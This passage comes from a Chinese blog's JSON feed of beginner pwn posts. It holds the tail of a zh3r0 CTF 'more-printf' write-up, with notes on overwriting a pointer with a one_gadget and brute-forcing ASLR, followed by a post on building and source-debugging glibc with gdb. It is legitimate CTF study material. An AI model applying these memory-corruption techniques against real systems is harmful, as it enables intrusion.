href=\"https://surager.pub/_posts/2021-05-11-x86%E6%9E%B6%E6%9E%84%E4%B8%8Bpwn%E9%A2%98%E7%9B%AElibc%E6%A6%82%E8%BF%B0/\">https://surager.pub/_posts/2021-05-11-x86架构下pwn题目libc概述/</a></p>\n<p>先用这个吧 2.27-3ubuntu1.5_amd64</p>\n<p>进去一会后按c, 就能够进入最后的调试了,不行就下一个,继续c</p>\n<p>关键再c就退出去了..</p>\n<p>注意下断点的地址, exit可以 那是不是可以下system\\execve</p>\n<p>直接q然后继续就好了</p>\n<p>gdb –pid 进去</p>\n<h3 id=\"为什么这里就可以只枚举32呢\"><a href=\"#为什么这里就可以只枚举32呢\" class=\"headerlink\" title=\"为什么这里就可以只枚举32呢?\"></a>为什么这里就可以只枚举32呢?</h3><p>​\t所以对抗alsr的点不是在onegadget这个地址上,这里是确定的, 那什么是不确定的呢?</p>\n<p>​\t就是要修改的地址的地址, 它不一定是0x08,可能是0x18 28 也可能是0x00 0x20, 所以才会有32种可能</p>\n<p>​\t不过在我的电脑上, 第2的字节的一半也变了…那随机化的范围又大了(关闭随机化的情况下,开启了好像又一样了)</p>\n<p>​\t</p>\n<h3 id=\"实际修改的指针\"><a href=\"#实际修改的指针\" class=\"headerlink\" title=\"实际修改的指针\"></a>实际修改的指针</h3><p>​\t</p>\n<p>​\t<font color=\"red\">改的其实是上面的函数的地址(实测)  作者提出的修改read+17行不通</font></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111153904670.png\" alt=\"image-20231111153904670\"></p>\n<h3 id=\"调试下断点和bt回溯遇到了问题\"><a href=\"#调试下断点和bt回溯遇到了问题\" class=\"headerlink\" title=\"调试下断点和bt回溯遇到了问题\"></a>调试下断点和bt回溯遇到了问题</h3><p>​\t首先,bt回溯时候的各种问题,我认为是因为劫持控制流破坏了识别算法, 识别不出来,</p>\n<p>syscall能下断点吗</p>\n<p>do_system</p>\n<p>gdb 执行了新的sh,怎么跟踪呢? 如何看上一个进程的bt</p>\n<p>为什么会执行到上面那里呢?</p>\n<p>为什么会从那里取值rip呢?</p>\n<p>这里貌似是比较重要的函数</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111151211775.png\" alt=\"image-20231111151211775\"></p>\n<p>这里面进行解析的吧, 是的,所以重点应该在这里</p>\n<p>printf_positional</p>\n<p>怎么样才能跟踪执行流呢</p>\n<p>故意输错 让他卡在那是不是就可以了</p>\n<p>注意看这里, 返回了最开始的栈帧,</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111153131246.png\" alt=\"image-20231111153131246\"></p>\n<h3 id=\"为什么只链接了那两个就可以了\"><a href=\"#为什么只链接了那两个就可以了\" class=\"headerlink\" title=\"为什么只链接了那两个就可以了??????\"></a>为什么只链接了那两个就可以了??????</h3><h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>  buffer &#x3D; (char *)malloc(0x20 + 1); &#x2F;&#x2F;为啥要+1? 感觉好像不加也一样</p>\n<p>​\tset $rdi&#x3D;_IO_stdout  ( 其他版本呢?)</p>\n<p>set *0x7ffc28b196d8&#x3D; 0x7f8d3729b2a5 (为啥一次设置不全呢?)</p>\n<p>以及,是否可以修改两次4字节呢… 方法有点多,但会越来越复杂…先暂时放一下</p>\n<p>​\t如何下断点来到这里呢? 最后返回onegadget的时候下不了断点</p>\n<p>gdb启动的时候如何多下几个断点</p>\n<p>为什么会从从rsp上面取值? </p>\n<h3 id=\"tips\"><a href=\"#tips\" class=\"headerlink\" title=\"tips\"></a>tips</h3><p>gdb中如何关了alsr调试呢</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set disable-randomization on 关闭</span><br><span class=\"line\">set disable-randomization off 开启</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.anquanke.com/post/id/85785\">https://www.anquanke.com/post/id/85785</a></p>\n<p><a href=\"https://xz.aliyun.com/t/12304\">https://xz.aliyun.com/t/12304</a></p>\n<p><a href=\"https://www.hakuya.work/post/2\">https://www.hakuya.work/post/2</a></p>\n<p><a href=\"https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/\">https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/</a></p>\n<p><a href=\"https://github.com/zh3r0/zh3r0-ctf/tree/main/V2/pwn/more-printf/public/vuln\">https://github.com/zh3r0/zh3r0-ctf/tree/main/V2/pwn/more-printf/public/vuln</a></p>\n<p><a href=\"https://blog.caprinux.com/2021/06/07/zh3ro-ctf-more-printf/\">https://blog.caprinux.com/2021/06/07/zh3ro-ctf-more-printf/</a></p>\n<p><a href=\"https://sangjun.xyz/125\">https://sangjun.xyz/125</a></p>\n<p>感觉前面几个讲的方法最后一步都有问题</p>\n<p><a href=\"https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/\">https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/</a></p>\n<p>这一篇或许是对的</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/",
            "title": "pwn入门-46-glibc源码调试",
            "date_published": "2023-11-06T13:01:36.000Z",
            "content_html": "<p>​\t有时候需要看库函数哪里出问题了,有源码调试的话,看起来会更直观和方便</p>\n<h1 id=\"glibc源代码调试\"><a href=\"#glibc源代码调试\" class=\"headerlink\" title=\"glibc源代码调试\"></a>glibc源代码调试</h1><p>​\t开启gdb后 dir  xxxx目录 即可</p>\n<p>​\t但dir命令加载源码只能指定单个目录或文件,在gdb启动的时候用这个命令来加载glibc源码进去就好了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb `find ~/path/to/glibc/source -type d -<span class=\"built_in\">printf</span> <span class=\"string\">&#x27;-d %p &#x27;</span>` ./a.out</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"当前机器版本libc\"><a href=\"#当前机器版本libc\" class=\"headerlink\" title=\"当前机器版本libc\"></a>当前机器版本libc</h2><p>​\t安装带调试版本libc</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install libc6-dbg  </span><br><span class=\"line\">apt install libc6-dbg:i386</span><br></pre></td></tr></table></figure>\n\n<p>​\t下载对应的源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> 修改/etc/apt/sources.<span class=\"built_in\">list</span> 开启deb-src (不知道是不是都要开)</span><br><span class=\"line\"><span class=\"number\">2.</span> apt update</span><br><span class=\"line\"><span class=\"number\">3.</span> apt source libc6-dev</span><br></pre></td></tr></table></figure>\n\n<p>​\t注意第三步会在当前目录进行下载</p>\n<p>​\t调试的时候进行指定即可: gdb -q .&#x2F;pwn -d &#x2F;xxx&#x2F;xxx&#x2F;glibc-2.31&#x2F; </p>\n<h1 id=\"不同版本glibc下载与编译\"><a href=\"#不同版本glibc下载与编译\" class=\"headerlink\" title=\"不同版本glibc下载与编译\"></a>不同版本glibc下载与编译</h1><h2 id=\"官方下载与编译\"><a href=\"#官方下载与编译\" class=\"headerlink\" title=\"官方下载与编译\"></a>官方下载与编译</h2><p><a href=\"https://ftp.gnu.org/gnu/glibc/\">https://ftp.gnu.org/gnu/glibc/</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone git://sourceware.org/git/glibc.git &amp;&amp; cd glibc</span><br><span class=\"line\">git checkout glibc-2.31</span><br><span class=\"line\">mkdir build &amp;&amp; cd build</span><br><span class=\"line\">../configure --prefix=/usr/local/glibc-2.31-debug --enable-debug=yes</span><br><span class=\"line\">make -j16</span><br><span class=\"line\">make install    # 这时候/usr/local/glibc-2.31-debug/就有文件了 包含库文件和头文件</span><br></pre></td></tr></table></figure>\n\n<p>查看当前分支: git branch</p>\n<p>查看有哪些分支: git branch -a</p>\n<h3 id=\"指定编译好的库进行文件编译\"><a href=\"#指定编译好的库进行文件编译\" class=\"headerlink\" title=\"指定编译好的库进行文件编译\"></a>指定编译好的库进行文件编译</h3><p>​\t–rpath指定共享库路径  -I指定动态链接器</p>\n<p>​\t就可以用指定的libc来编译代码了, 这样的话, 也会很自然就有glibc的源代码可以调试了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -L/usr/local/glibc<span class=\"number\">-2.31</span>-debug/lib -Wl,--rpath=/usr/local/glibc<span class=\"number\">-2.31</span>-debug/lib -Wl,-I/usr/local/glibc<span class=\"number\">-2.31</span>-debug/lib/ld<span class=\"number\">-2.31</span>.so hello.c -o hello</span><br></pre></td></tr></table></figure>\n\n<p>​\t为什么不用加 -g了? (需要的,如果要看hello.c的源代码的话)</p>\n<p>​\t但是用glibcallinone下载的不行..有问题, 那是因为它只有编译好的库,没有头文件之类的吧?</p>\n<h2 id=\"glibc-all-in-one工具\"><a href=\"#glibc-all-in-one工具\" class=\"headerlink\" title=\"glibc-all-in-one工具\"></a>glibc-all-in-one工具</h2><p>​\t这里是编译好的,一般都是带符号的,但是如果需要源代码调试还是需要下载源码并加载进gdb里面进行调试</p>\n<p>​\t<a href=\"https://blog.csdn.net/csdn546229768/article/details/122691241\">https://blog.csdn.net/csdn546229768/article/details/122691241</a></p>\n<p>​\t如果网站里没有的话,就修改download源代码, 换个source看看,google精准搜索搜索一下</p>\n<h3 id=\"debug信息\"><a href=\"#debug信息\" class=\"headerlink\" title=\"debug信息\"></a>debug信息</h3><p>​\t符号文件在哪呢, 被编译进程序里了吧,我记得之前有单独的符号文件的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231023223614611.png\" alt=\"image-20231023223614611\"></p>\n<p>ls -al &#x2F;usr&#x2F;lib&#x2F;debug&#x2F;.build-id&#x2F;这里有</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drwxr-xr-x   <span class=\"number\">2</span> root root  <span class=\"number\">4096</span> <span class=\"number\">7</span>月  <span class=\"number\">27</span> <span class=\"number\">10</span>:<span class=\"number\">48</span> .</span><br><span class=\"line\">drwxr-xr-x <span class=\"number\">236</span> root root  <span class=\"number\">4096</span> <span class=\"number\">7</span>月  <span class=\"number\">27</span> <span class=\"number\">10</span>:<span class=\"number\">48</span> ..</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">23496</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> <span class=\"number\">329f</span>3d85e153a01672b77b853beda0faf0dee6.debug</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">20104</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> <span class=\"number\">9f</span>5043bbf7cfbf4dfd27684d9c3cbcbb835bd9.debug</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">19468</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> b0728b23be4032704a004d8066a268c4b6924a.debug</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">20052</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> bbb582f3d2cd3464764682f1937b4e3d9c2641.debug</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">22200</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> c4ae3a65bc87ea96986b3b2441e892c8a433f0.debug</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">22168</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> cd9124f765fe93560701d55d5c61c37be4657a.debug</span><br></pre></td></tr></table></figure>\n\n\n\n<p>但是glibcallinone里没找到这个呀…</p>\n<p>他们之间是什么关系呢?</p>\n<h2 id=\"libc编译案例\"><a href=\"#libc编译案例\" class=\"headerlink\" title=\"libc编译案例\"></a>libc编译案例</h2><p>​\t做一道题需要23版本的libc,用ubuntu20编译的有问题..换18试试 (也有很多报错, 难道得换debian?)</p>\n<p>​\tsource是源码,右边是编译好的,但是没有符号信息</p>\n<p>​\t难道版本不对? 这个source看起来是没有什么问题的,下载后看了下源码文件</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231023213302220.png\" alt=\"image-20231023213302220\"></p>\n<p><a href=\"https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu11\">https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu11</a></p>\n<p><a href=\"http://launchpadlibrarian.net/409875491/libc6_2.23-0ubuntu11_amd64.deb\">http://launchpadlibrarian.net/409875491/libc6_2.23-0ubuntu11_amd64.deb</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir build &amp;&amp; cd build</span><br><span class=\"line\">../configure --prefix=/usr/local/glibc<span class=\"number\">-2.23</span>-debug --enable-debug=yes</span><br><span class=\"line\">make -j16</span><br><span class=\"line\">make install    # 这时候/usr/local/glibc<span class=\"number\">-2.23</span>-debug/就有文件了 包含库文件和头文件</span><br></pre></td></tr></table></figure>\n\n\n\n<p>罢了……..还是报错….处理不了……..(回头试试16, 或者说 还是得换debian?  不纠结这个编译问题了…)</p>\n<h3 id=\"转机\"><a href=\"#转机\" class=\"headerlink\" title=\"转机\"></a>转机</h3><p><a href=\"https://launchpad.net/ubuntu/xenial/amd64/libc6-dbg/2.23-0ubuntu11\">https://launchpad.net/ubuntu/xenial/amd64/libc6-dbg/2.23-0ubuntu11</a></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231106210245051.png\" alt=\"image-20231106210245051\"></p>\n<p>嘶,用了一下还是不太行</p>\n<p>不过实际做题也未必要一模一样的环境,反正给了libc,可以从里面找偏移</p>\n<h3 id=\"报错处理\"><a href=\"#报错处理\" class=\"headerlink\" title=\"报错处理\"></a>报错处理</h3><p>之前报错说要加–disable-werror, 但是好像也没啥用,</p>\n<p>..&#x2F;configure –disable-werror  –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;glibc-2.23  –enable-debug&#x3D;yes</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error: argument <span class=\"number\">1</span> of type ‘<span class=\"class\"><span class=\"keyword\">struct</span> __<span class=\"title\">jmp_buf_tag</span> *’ <span class=\"title\">declared</span> <span class=\"title\">as</span> <span class=\"title\">a</span> <span class=\"title\">pointer</span> [-<span class=\"title\">Werror</span>=</span><span class=\"built_in\">array</span>-parameter=]</span><br><span class=\"line\">  <span class=\"number\">743</span> | <span class=\"keyword\">extern</span> <span class=\"type\">int</span> __sigsetjmp (<span class=\"keyword\">struct</span> __jmp_buf_tag *__env,</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://stackoverflow.com/questions/76079071/when-i-compile-glibc-2-28-with-the-make-command-on-centos-7-5-i-got-the-error-l\">https://stackoverflow.com/questions/76079071/when-i-compile-glibc-2-28-with-the-make-command-on-centos-7-5-i-got-the-error-l</a></p>\n<p>make[1]: *** [Makefile:214: stdio-common&#x2F;subdir_lib] Error</p>\n<p><a href=\"https://www.cnblogs.com/zq10/p/14314952.html\">https://www.cnblogs.com/zq10/p/14314952.html</a></p>\n<p><a href=\"https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19\">https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19</a></p>\n<p>make[2]: *** No rule to make target ‘..&#x2F;manual&#x2F;errno.texi’, needed by ‘..&#x2F;sysdeps&#x2F;gnu&#x2F;errlist.c’.  Stop</p>\n<p>Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion &#96;sym !&#x3D; NULL’ failed!</p>\n<p>问: 这里有现成的libc可以用,但是没有符号文件,    符号和源代码又是两回事吧</p>\n<p>答: 是的,两回事</p>\n<p>问: 没有符号咋办, 只能进行编译吗..</p>\n<p>答:  我记得之前做海大ctf,ida可以导入符号文件,网上有编译好的符号文件,这个网站上也有symbol, 但是不全</p>\n<p>问: gcc直接用这里的库编译会有问题,需要install?</p>\n<p>问: 如何编译符号文件呢</p>\n<h1 id=\"调试案例\"><a href=\"#调试案例\" class=\"headerlink\" title=\"调试案例\"></a>调试案例</h1><h2 id=\"printf的调用路径\"><a href=\"#printf的调用路径\" class=\"headerlink\" title=\"printf的调用路径\"></a>printf的调用路径</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hello,%s\\n&quot;</span>,<span class=\"string\">&quot;world&quot;</span>); <span class=\"comment\">//防止优化为puts</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t调试, bt追踪栈</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">0  0x00007ffff7e5ca69 <span class=\"keyword\">in</span> __printf (format=0x55555555600a <span class=\"string\">&quot;hello,%s\\n&quot;</span>) at printf.c:28</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">1  0x0000555555555169 <span class=\"keyword\">in</span> main ()</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">2  0x00007ffff7e2d013 <span class=\"keyword\">in</span> __libc_start_main (main=0x555555555149 &lt;main&gt;, argc=1, argv=0x7fffffffe5a8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe598) at ../csu/libc-start.c:308</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">3  0x000055555555508e <span class=\"keyword\">in</span> _start ()</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t会发现进入的是__printf函数,为什么不是printf函数呢? 需要看libc源代码</p>\n<p>​\t进到这里是因为ldbl_strong_alias (__printf, printf); 将printf和  _ _ printf进入了的函数统一为 _ _printf</p>\n<p>​\tstdio-common&#x2F;printf.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;libioP.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdarg.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> printf</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Write formatted output to stdout from the format string FORMAT.  */</span></span><br><span class=\"line\"><span class=\"comment\">/* VARARGS1 */</span></span><br><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">__printf (<span class=\"type\">const</span> <span class=\"type\">char</span> *format, ...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  va_list arg;</span><br><span class=\"line\">  <span class=\"type\">int</span> done;</span><br><span class=\"line\"></span><br><span class=\"line\">  va_start (arg, format);</span><br><span class=\"line\">  done = <span class=\"built_in\">vfprintf</span> (<span class=\"built_in\">stdout</span>, format, arg);</span><br><span class=\"line\">  va_end (arg);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> _IO_printf</span></span><br><span class=\"line\">ldbl_strong_alias (__printf, <span class=\"built_in\">printf</span>);</span><br><span class=\"line\"><span class=\"comment\">/* This is for libg++.  */</span></span><br><span class=\"line\">ldbl_strong_alias (__printf, _IO_printf);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t__printf又主要调用了vfprintf函数,在stdio-common&#x2F;vfprintf.c中, 这个函数有点长</p>\n<h2 id=\"函数完整加载过程\"><a href=\"#函数完整加载过程\" class=\"headerlink\" title=\"函数完整加载过程\"></a>函数完整加载过程</h2><p>恩….比较复杂..有时间专门学习下..</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/callgraph.png\" alt=\"image of the callgraph for all the routines involved in program startup on linux\"></p>\n<p>原文地址: <a href=\"http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html\">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a></p>\n<p>翻译: <a href=\"https://zhuanlan.zhihu.com/p/52054044\">https://zhuanlan.zhihu.com/p/52054044</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/521205296\">https://zhuanlan.zhihu.com/p/521205296</a></p>\n<p>其他参考: </p>\n<p><a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2021/12/12/csu/\">https://xuanxuanblingbling.github.io/ctf/pwn/2021/12/12/csu/</a></p>\n<p>程序员的自我修养里面也有</p>\n<h3 id=\"start\"><a href=\"#start\" class=\"headerlink\" title=\"_start\"></a>_start</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000000000001060 &lt;_start&gt;:</span><br><span class=\"line\">    1060:\tf3 0f 1e fa          \tendbr64</span><br><span class=\"line\">    1064:\t31 ed                \txor    %ebp,%ebp</span><br><span class=\"line\">    1066:\t49 89 d1             \tmov    %rdx,%r9</span><br><span class=\"line\">    1069:\t5e                   \tpop    %rsi</span><br><span class=\"line\">    106a:\t48 89 e2             \tmov    %rsp,%rdx</span><br><span class=\"line\">    106d:\t48 83 e4 f0          \tand    $0xfffffffffffffff0,%rsp</span><br><span class=\"line\">    1071:\t50                   \tpush   %rax</span><br><span class=\"line\">    1072:\t54                   \tpush   %rsp</span><br><span class=\"line\">    1073:\t4c 8d 05 66 01 00 00 \tlea    0x166(%rip),%r8        # 11e0 &lt;__libc_csu_fini&gt;</span><br><span class=\"line\">    107a:\t48 8d 0d ef 00 00 00 \tlea    0xef(%rip),%rcx        # 1170 &lt;__libc_csu_init&gt;</span><br><span class=\"line\">    1081:\t48 8d 3d c1 00 00 00 \tlea    0xc1(%rip),%rdi        # 1149 &lt;main&gt;</span><br><span class=\"line\">    1088:\tff 15 52 2f 00 00    \tcallq  *0x2f52(%rip)        # 3fe0 &lt;__libc_start_main@GLIBC_2.2.5&gt;</span><br><span class=\"line\">    108e:\tf4                   \thlt</span><br><span class=\"line\">    108f:\t90                   \tnop</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h3 id=\"libc-start-main\"><a href=\"#libc-start-main\" class=\"headerlink\" title=\"__libc_start_main\"></a>__libc_start_main</h3><p>starti可以从最开始启动时下断点</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231105211445286.png\" alt=\"image-20231105211445286\"></p>\n<p>可以慢慢地去一探究竟程序的过程了！</p>\n<p><a href=\"https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html\">https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html</a></p>\n<p>​\t它会处理执行环境的初始化工作, 然后调用main函数, 并且处理main函数的返回,</p>\n<p>​\t它可能干的事如下</p>\n<ul>\n<li>performing any necessary security checks if the effective user ID is not the same as the real user ID.</li>\n<li>initialize the threading subsystem.</li>\n<li>registering the <code>*rtld_fini*</code> to release resources when this dynamic shared object exits (or is unloaded).</li>\n<li>registering the <code>*fini*</code> handler to run at program exit.</li>\n<li>calling the initializer function <code>(**init*)()</code>.</li>\n<li>calling <code>main()</code> with appropriate arguments.</li>\n<li>calling <code>exit()</code> with the return value from <code>main()</code>.</li>\n</ul>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://xuanxuanblingbling.github.io/ctf/tools/2020/03/20/gdb/\">https://xuanxuanblingbling.github.io/ctf/tools/2020/03/20/gdb/</a></p>\n<p>[原创]关于不同版本 glibc 更换的一些问题: <a href=\"https://bbs.kanxue.com/thread-254868.htm\">https://bbs.kanxue.com/thread-254868.htm</a></p>\n<p><a href=\"https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19\">https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19</a></p>\n<h1 id=\"问答\"><a href=\"#问答\" class=\"headerlink\" title=\"问答\"></a>问答</h1><p>有无符号的区别在哪呢….蒙圈了</p>\n<p>函数、变量符号</p>\n<p>有符号的话是可以看到定义的那些变量、函数等,但是不知道行数、具体的代码</p>\n<p>符号文件在哪?</p>\n<p>deb如何解包 dpkx -x   xxxxx.deb .&#x2F;</p>\n<p>debug文件为什么会有单独的,为什么glibcallinone里的不用呢</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/",
            "title": "pwn入门-45-10月月赛两题",
            "date_published": "2023-10-30T13:15:56.000Z",
